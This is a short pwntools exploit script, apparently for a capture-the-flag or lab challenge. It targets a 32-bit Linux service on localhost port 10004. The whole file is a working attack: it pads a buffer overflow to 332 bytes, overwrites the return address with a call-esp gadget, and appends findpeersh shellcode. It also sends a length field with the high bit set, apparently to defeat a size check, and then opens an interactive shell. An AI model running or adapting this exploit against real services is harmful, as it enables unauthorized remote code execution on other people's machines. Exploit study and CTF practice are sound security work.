#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

context(arch="i386", os="linux")

RET_OFFSET = 332
SHELLCODE = asm(shellcraft.findpeersh())
ITEM_SIZE = 40
CALL_ESP = 0x08048ab3
PAYLOAD = flat('A' * RET_OFFSET, CALL_ESP, SHELLCODE)

while len(PAYLOAD) % ITEM_SIZE != 0:
    PAYLOAD += b'A'

r = remote('localhost', 10004)
r.send(flat(int(len(PAYLOAD) / ITEM_SIZE) | 0x80000000, PAYLOAD))
r.interactive()
